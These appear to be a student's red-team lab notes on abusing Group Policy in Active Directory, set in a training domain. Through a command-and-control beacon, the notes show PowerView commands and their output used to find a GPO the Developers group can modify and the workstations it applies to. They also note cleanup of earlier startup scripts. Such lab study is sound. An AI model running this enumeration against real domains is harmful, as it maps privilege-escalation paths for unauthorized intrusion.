Modifying an existing GPO that is already applied to one or more OUs is the most straightforward scenario.  To search for these, we need to enumerate all GPOs in the domain with `Get-DomainGPO` and check the ACL of each one with `Get-DomainObjectAcl`.  We want to filter any for which a principal has modify privileges such as CreateChild, WriteProperty or GenericWrite, and also want to filter out the legitimate principals including SYSTEM, Domain Admins and Enterprise Admins.


# Deleting [[2. Modify Existing GPO - broken]] scripts

open `WKSTN-2` hit the windows key and open up `Group Policy Management Editor`  and click on `vulnerable GPO`
![[Pasted image 20231219142657.png]]
`right click` -> `edit` on `vulnerable GPO` and navigate to `Windows Settings` -> `scripts` -> `startup` to see scripts  and remove them
![[Pasted image 20231219142818.png]]
open up a `cmdline` and `gupdate /force` to enforce the deletion on `WKSTN-2` and `reboot` the machine
checked to ensure no `scripts` existed upon `reboot`


on `WKSTN-2` as `SYSTEM` getting `domain-GPO`
```powershell
beacon> powershell-import C:\Tools\PowerSploit\Recon\PowerView.ps1
[*] Tasked beacon to import: C:\Tools\PowerSploit\Recon\PowerView.ps1
[+] host called home, sent: 143801 bytes
```
the `results`
```powershell
beacon> powerpick Get-DomainGPO | Get-DomainObjectAcl -ResolveGUIDs | ? { $_.ActiveDirectoryRights -match "CreateChild|WriteProperty" -and $_.SecurityIdentifier -match "S-1-5-21-569305411-121244042-2357301523-[\d]{4,10}" }
[+] host called home, sent: 10 bytes
[*] Tasked beacon to run: Get-DomainGPO | Get-DomainObjectAcl -ResolveGUIDs | ? { $_.ActiveDirectoryRights -match "CreateChild|WriteProperty" -and $_.SecurityIdentifier -match "S-1-5-21-569305411-121244042-2357301523-[\d]{4,10}" } (unmanaged)
[+] host called home, sent: 138048 bytes
[+] received output:


AceType               : AccessAllowed
ObjectDN              : CN={5059FAC1-5E94-4361-95D3-3BB235A23928},CN=Policies,CN=System,DC=dev,DC=c
                        yberbotic,DC=io
ActiveDirectoryRights : CreateChild, DeleteChild, ReadProperty, WriteProperty, GenericExecute
OpaqueLength          : 0
ObjectSID             : 
InheritanceFlags      : ContainerInherit
BinaryLength          : 36
IsInherited           : False
IsCallback            : False
PropagationFlags      : None
SecurityIdentifier    : S-1-5-21-569305411-121244042-2357301523-1107
AccessMask            : 131127
AuditFlags            : None
AceFlags              : ContainerInherit
AceQualifier          : AccessAllowed
```
one result was returned, next we `resolve` the GPO name and the `SID` of the principal.
in order to get the full path ran `ls` command
```powershell
beacon> ls \\dev.cyberbotic.io\SysVol\dev.cyberbotic.io\Policies\
[*] Tasked beacon to list files in \\dev.cyberbotic.io\SysVol\dev.cyberbotic.io\Policies\
[+] host called home, sent: 71 bytes
[*] Listing: \\dev.cyberbotic.io\SysVol\dev.cyberbotic.io\Policies\

 Size     Type    Last Modified         Name
 ----     ----    -------------         ----
          dir     12/12/2023 20:33:38   {20F769F1-60E6-46E0-B9C5-C8A5CEDB8F60}
          dir     08/16/2022 12:20:45   {2BE4337D-D231-4D23-A029-7B999885E659}
          dir     08/30/2022 17:25:09   {2DFB6C00-4C35-47D9-A4EA-3FCA3A09E2B3}
          dir     08/15/2022 16:00:01   {31B2F340-016D-11D2-945F-00C04FB984F9}
																																		         ` dir     12/13/2022 12:35:45   {5059FAC1-5E94-4361-95D3-3BB235A23928}`
          dir     08/15/2022 16:00:01   {6AC1786C-016F-11D2-945F-00C04fB984F9}
          dir     08/16/2022 08:45:26   {7F8F11E4-FD94-45F7-944F-1876EB2C76C8}
          dir     08/30/2022 17:38:20   {99E523A7-4266-4DB8-A3D5-A49919A7836F}
          dir     08/15/2022 17:31:56   {B6992C25-4EBA-4D6C-AC7B-BEAFBC6A9A14}
          dir     08/15/2022 19:00:20   {BDDA1ED9-9FC6-4169-85BA-FDD51CFCDC23}
          dir     08/15/2022 17:30:07   {D5D662E4-D1BB-4362-BC9B-5125F278FB4E}
```
This shows us that members of the "Developers" group can modify "Vulnerable GPO".
```powershell
beacon> powerpick Get-DomainGPO -Identity "CN={5059FAC1-5E94-4361-95D3-3BB235A23928},CN=Policies,CN=System,DC=dev,DC=cyberbotic,DC=io" | select displayName, gpcFileSysPath
[*] Tasked beacon to run: Get-DomainGPO -Identity "CN={5059FAC1-5E94-4361-95D3-3BB235A23928},CN=Policies,CN=System,DC=dev,DC=cyberbotic,DC=io" | select displayName, gpcFileSysPath (unmanaged)
[+] host called home, sent: 138058 bytes
[+] received output:

displayname    gpcfilesyspath                                                                      
-----------    --------------                                                                      
Vulnerable GPO \\dev.cyberbotic.io\SysVol\dev.cyberbotic.io\Policies\{5059FAC1-5E94-4361-95D3-3BB235A23928}
```
We also want to know which OU(s) this GPO applies to, and by extension which computers are in those OUs.  GPOs are linked to an OU by modifying the `gPLink` property of the OU itself.  The `Get-DomainOU` cmdlet has a handy `-GPLink` parameter which takes a GPO GUID.
```powershell
beacon> powerpick Get-DomainOU -GPLink "{5059FAC1-5E94-4361-95D3-3BB235A23928}" | select distinguishedName
[+] host called home, sent: 10 bytes
[*] Tasked beacon to run: Get-DomainOU -GPLink "{5059FAC1-5E94-4361-95D3-3BB235A23928}" | select distinguishedName (unmanaged)
[+] host called home, sent: 138048 bytes
[+] received output:

distinguishedname                         
-----------------                         
OU=Workstations,DC=dev,DC=cyberbotic,DC=io
```
Finally, to get the computers in an OU, we can use `Get-DomainComputer` and use the OU's distinguished name as a search base.
```powershell
beacon> powershell Get-DomainComputer -SearchBase "OU=Workstations,DC=dev,DC=cyberbotic,DC=io" | select dnsHostName

dnshostname              
-----------              
wkstn-1.dev.cyberbotic.io
wkstn-2.dev.cyberbotic.io
```